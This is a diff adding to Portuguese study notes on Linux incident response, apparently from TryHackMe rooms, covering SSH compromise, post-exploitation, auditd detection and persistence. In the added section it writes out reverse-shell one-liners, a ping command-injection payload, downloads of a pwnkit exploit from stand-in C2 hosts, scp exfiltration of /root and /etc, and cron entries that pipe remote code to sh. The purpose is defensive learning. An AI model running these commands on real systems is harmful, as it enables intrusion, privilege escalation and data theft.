@@ -389,15 +389,23 @@ O que indica **Atividade pós-exploração (post-exploitation).** Possíveis obj
 A análise dos logs confirma que o ambiente foi alvo de ataques automatizados de força bruta via SSH, seguidos por comprometimento efetivo de credenciais. Foi identificado acesso não autorizado à conta root a partir do IP externo `91.224.92.79`, caracterizando comprometimento crítico do sistema. Adicionalmente, o usuário `ubuntu`, que originalmente utilizava autenticação por chave SSH, passou a ser acessado via senha a partir do IP `10.64.91.229`, indicando possível vazamento ou reutilização de credenciais. Após os acessos indevidos, foram observadas atividades típicas de pós-exploração, incluindo elevação de privilégios, modificação de arquivos de configuração e tentativas de manipulação de logs, sugerindo que o atacante buscou manter persistência e ocultar evidências.
 ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Após a invasão o usuário provavelmente começou sua exploração pelo sistema. Normalmente o processo de obter acesso a um sistema é feito por bots e depois um humano realiza o trabalho de exploração. Os comandos mais comuns costumam ser:
-<table>
-  <tr>Sistema operacional e arquivos</tr>
+<table border=2>
+  <tr>
+    <td>Sistema operacional e arquivos</td>
     <td>pwd, ls /, env, uname -a (nome e versão do kernel), lsb_release -a (informações sobre a versão do linux),  hostname</td>
-  <tr>Usuários e grupos</tr>
+  </tr>
+  <tr>
+    <td>Usuários e grupos</td>
     <td>id (retorna informações sobre o usuário atual), whoami, w (mostra usuários logados e os programas que rodam), last (mostra logins e logouts e reinicializações do sistema) cat /etc/sudoers (mostra o arquivo de configuração do sudo) cat /etc/passwd (mostra dados das contas dos usuários)</td>
-  <tr>Redes e processos</tr>
+  </tr>
+  <tr>
+    <td>Redes e processos</td>
     <td>ps aux, top, ip a, ip r (tabela de roteamento), arp -a, ss -tnlp (examinar sockets), netstat -tnlp (conexões tcp ativas)</td>
-  <tr>Nuvem e Sandbox</tr>
+  </tr>
+  <tr>
+    <td>Nuvem e Sandbox</td>
     <td>systemd-detect-virt, lsmod, uptime, pgrep "<edr-or-sandbox>"</td>
+  </tr>
 </table>
 
 O comando mais importante para se manter atento é “whoami” já que atacantes sempre o usam ao invadir um sistema, dessa forma, é preciso criar uma regra de detecção para esta regra. Utilizando o auditd, as regras são inseridas em **`/etc/audit/rules.d/audit.rules`** , ativando com **`sudo augenrules --load`**
@@ -409,12 +417,18 @@ registra sempre que a chamada de sistema terminar de executar
 ```
 
 <table>
-  <tr>Encontrar e roubar dados e credenciais</tr>
+  <tr>
+    <td>Encontrar e roubar dados e credenciais</td>
     <td>history | grep pass, find / -name .env, find /home -name id_rsa</td>
-  <tr>Verificar se o sistema está disponível para minerar criptomoeda</tr>
+  </tr>
+  <tr>
+    <td>Verificar se o sistema está disponível para minerar criptomoeda</td>
     <td>cat /proc/cpuinfo, lscpu | grep Model, free -m, top, htop</td>
-  <tr>Scan de rede para verificar novas vítimas</tr>
+  </tr>
+  <tr>
+    <td>Scan de rede para verificar novas vítimas</td>
     <td>ping <ip>, for ip in 192.168.1.{1..254}; do nc -w 1 $ip 22 done</td>
+  </tr>
 </table>
 
 Para realizar uma investigação bem sucedida o ideal é criar um process tree, ou seja, identificar os passos tomados por um atacante e construir um cenário. Exemplo: procurar pelo comando “whoami” e ir investigando os processos pai.
@@ -488,3 +502,89 @@ type=EXECVE msg=audit(09/11/25 21:15:20.513:2287) : argc=3 a0=bash a1=-c a2=for 
 A análise detalhada do arquivo `audit.log` confirma o comprometimento total da máquina virtual por meio de uma cadeia de infecção bem-sucedida voltada à execução de um cryptominer. O incidente teve início com a quebra de segurança no serviço SSH, onde o atacante obteve acesso direto como superusuário utilizando o IP externo `45.9.148.125` [audit.log]. Imediatamente após a autenticação bem-sucedida, técnicas automatizadas de reconhecimento e evasão de defesa foram acionadas para mapear o ambiente [audit.log]. O invasor buscou ativamente pela presença de soluções de segurança e EDRs (como CrowdStrike, SentinelOne e Trend Micro) [audit.log] e realizou a enumeração de usuários do sistema, garantindo que suas atividades não fossem mitigadas de forma precoce. [1]Dando continuidade ao ataque, o vetor de persistência e ocultação foi consolidado com o download e a descompactação do arquivo `kernupd.tar.gz` dentro do diretório `/tmp/.apt` [audit.log]. Esta escolha de nomenclatura e localização simula de forma fraudulenta componentes legítimos do gerenciador de pacotes e atualizações do sistema operacional, configurando uma clara tentativa de mascaramento tático [audit.log]. O binário malicioso recebeu permissões de execução e foi disparado em segundo plano por meio do comando `nohup` (continuar rodando em segundo plano), uma abordagem padrão para garantir que o processo de mineração continue consumindo os recursos computacionais da VM de forma ininterrupta, mesmo após o encerramento da sessão interativa [audit.log].Por fim, as evidências apontam que o impacto do ataque não se restringiu à máquina local. Utilizando o servidor comprometido como ponto de apoio, o atacante iniciou uma fase de movimentação lateral na rede interna [audit.log]. Através de um loop em Bash e do utilitário Netcat, foi realizado um escaneamento focado na porta 22 (SSH) cobrindo a faixa de IPs `10.10.12.1` a `10.10.12.10` [audit.log], com o objetivo de identificar novos alvos vulneráveis e expandir a infraestrutura de mineração. Diante do controle total obtido pelo invasor em nível de root, a integridade do sistema operacional está completamente violada [audit.log]. A recomendação de segurança para a remediação imediata envolve o isolamento de rede da VM, o bloqueio do IP de origem, a revogação de credenciais e a reconstrução total da instância a partir de uma imagem limpa e segura.
 ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Após conseguir acesso a um sistema, para facilitar a exploração, agentes de ameaça utilizam reverse shells ou shells reversos TryHackMe Shells Overview e para isso, utilizam algumas estratégias como: 
+- `bash -i >& /dev/tcp/10.10.10.10/1337 0>&1` → a vítima abre um bash para 10.10.10.10:1337
+- `socat TCP:10.20.20.20:2525 EXEC:'bash',pty,stderr,setsid,sigint,sane` → mesma coisa mas através de socat e para o endereço 10.20.20.20:2525
+- `python3 -c '[...] s.connect(("10.30.30.30",80));pty.spawn("bash")’` → ou através de python para o endereço 10.30.30.30:80
+
+Reverse shells são considerados críticos porque significam que o atacante já conseguiu acesso ao sistema. São detectados através do auditd.
+
+> Investigando
+
+Acessando a aplicação TryPingMe, posso testar a aplicação com 127.0.0.1 && whoami . A estrutura do comando sendo: end_ip && comando , ou seja, realizo o ping ao definir um endereço porque é o que o input aceita e adiciono um comando através do operador “&”. A saída fica:
+```
+PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
+64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.022 ms
+64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.037 ms
+64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.043 ms
+64 bytes from 127.0.0.1: icmp_seq=4 ttl=64 time=0.033 ms
+
+--- 127.0.0.1 ping statistics ---
+4 packets transmitted, 4 received, 0% packet loss, time 3105ms
+rtt min/avg/max/mdev = 0.022/0.033/0.043/0.007 ms
+➡️svctrypingme
+# outro exemplo:
+PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
+64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.032 ms
+64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.085 ms
+64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.050 ms
+64 bytes from 127.0.0.1: icmp_seq=4 ttl=64 time=0.041 ms
+
+--- 127.0.0.1 ping statistics ---
+4 packets transmitted, 4 received, 0% packet loss, time 3051ms
+rtt min/avg/max/mdev = 0.032/0.052/0.085/0.020 ms
+➡️/opt/trypingme
+```
+Mesmo assim, atacantes podem ficar presos devido a falta de privilégios e para isso utilizam algumas técnicas como, para acessar como root, exploram um sistema ubuntu não atualizado `uname -a` através da ferramenta Pwnkit `wget http://bad.thm/pwnkit.sh | bash` ou identifica um binário env com `find /bin -perm 4000` e, com isso, obtém acesso à `/bin/env /bin/bash -p` ou lista as chaves ssh `ls /etc/ssh` de um arquivo “ssh-backup-key” não protegido obtendo acesso a um sistema com `ssh root@127.0.0.1 -i ssh-backup-key` . Comandos comuns: https://gtfobins.org/#+suid
+
+O passo-a-passo costuma seguir:
+< [!TIP]
+< egrep permite procura por termos utilizando expressões regulares
+
+```
+# Detecção 1: comandos de descoberta
+whoami                                                # Retorna o usuário "www-data"
+id; pwd; ls -la; crontab -l                           # Usuário e diretório atual, tarefas agendadas
+ps aux | egrep "edr|splunk|elastic"                   # Lista tarefas atuais, procura por edrs executando
+uname -r                                              # Retorna a versão antiga 4.4 do kernel
+
+# Detecção 2: download para a pasta temporária
+wget http://c2-server.thm/pwnkit.c -O /tmp/pwnkit.c   # donwload do exploit pwnkit
+gcc /tmp/pwnkit.c -o /tmp/pwnkit                      # compila o exploit pwnkit
+chmod +x /tmp/pwnkit                                  # Faz o exploit ficar executável
+/tmp/pwnkit                                           # Tenta executar o exploit
+
+# Detecção 3: Exfiltração de dados com scp
+whoami                                                # Agora retorna o usuário root
+tar czf dump.tar.gz /root /etc/                       # Arquiva dados sensíveis
+scp dump.tar.gz attacker@c2-server.thm:~              # Exfiltra os dados
+```
+
+(Ou seja, se o usuário mudou há algo suspeito)
+
+Algumas formas de persistências são:
+
+1. Cron: forma mais comum, utilizam atividades agendadas incluindo atividades como reboot através de:
+   ```
+   # A line added by APT29 to /var/spool/cron/<user> to run malware on boot
+   @reboot nohup /home/<user>/.<hidden-directory>/<malware-name> > /dev/null 2>&1 &
+  
+   #ou repetir o processo em um intervalo de tempo
+   # A simplified command that adds the cron job to /etc/cron.d/root
+   echo "*/10 * * * root (curl https://pastebin.com/raw/1NtRkBc3) | sh" > /etc/cron.d/root
+   ```
+2. Systemd: permite a criação de serviços tendo privilégios root. Geralmente se escondem como um serviço legítimo, mas apontam para um arquivo malicioso:
+   ```
+   # A simplified content of /lib/systemd/system/cloud-online.service file
+    [Unit]
+    Description=Initial cloud-online job    # Fake description to mimic a trusted service
+    [Service]
+    ExecStart=/usr/bin/cloud-online         # GOGETTER malware disguisted as a trusted file
+    ```
+Portanto, pastas importantes para se observar incluem: /etc/crontab, /etc/cron.d*, /var/spool/cron/*, /var/spool/crontab/* ,/lib/systemd/system/*, /etc/systemd/system/* ,nano /etc/crontab, crontab -e, systemctl start|enable <service> ou em lugares como → Canonical systemd.unit
+
+> Investigando
+
+Para manter acesso, atacantes podem criar persistência em contas de usuários, geralmente para roubar mais dados com o passar do tempo. Para isso, criam uma conta e a tornam privilegiada e para detectá-la basta criar a árvore de processos da criação do comportamento de tal usuário. Outra forma é através da criação de uma chave ssh que quando armazenada com outras no arquivo “~/.ssh/authorized_keys” (cada usuário possui um desse arquivo), porém é muito difícil reconhecer portanto é preciso investigar a origem e o modo como tal chave foi adicionada. 
+Sistemas linux podem ser como um ponto de acesso para outros dispositivos de uma organização e comprometer vários dispositivos de uma vez, agindo como um ransomware, explorando hypervisors.
+
+> Investigando
